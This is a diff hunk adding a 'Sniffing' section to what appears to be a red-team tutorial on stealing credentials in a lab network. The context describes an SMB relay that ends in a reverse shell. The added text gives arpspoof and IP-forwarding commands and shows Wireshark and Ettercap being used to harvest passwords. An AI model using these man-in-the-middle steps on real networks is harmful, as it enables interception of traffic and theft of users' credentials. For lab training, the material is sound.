@@ -77,3 +77,28 @@ exploit -j
 Machine 10.0.2.7 asks for an unknown host, then the attacker machine 10.0.2.15 responds to it with its own IP address, then machine 10.0.2.7 sends its credentials to the attacker machine 10.0.2.15 on port SMB, then the attacker machine takes these credentials and relays them to another machine 10.0.2.6, then machine 10.0.2.6 executed our reverse shell and the shell get back to us at 10.0.2.15.
 
 ![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen4.png?raw=true)
+
+## Sniffing
+
+### ARPspoof
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward // To enable traffic forwarding
+arpspoof -i eth0 -t 10.0.2.6 -r 10.0.2.1
+```
+
+### Wireshark
+
+Search For Passwords
+
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen5.png?raw=true)
+
+Follow TCP Stream
+
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen6.png?raw=true)
+
+
+### Ettercap
+
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen7.png?raw=true)
+
+URL: https://vimeo.com/368434044​
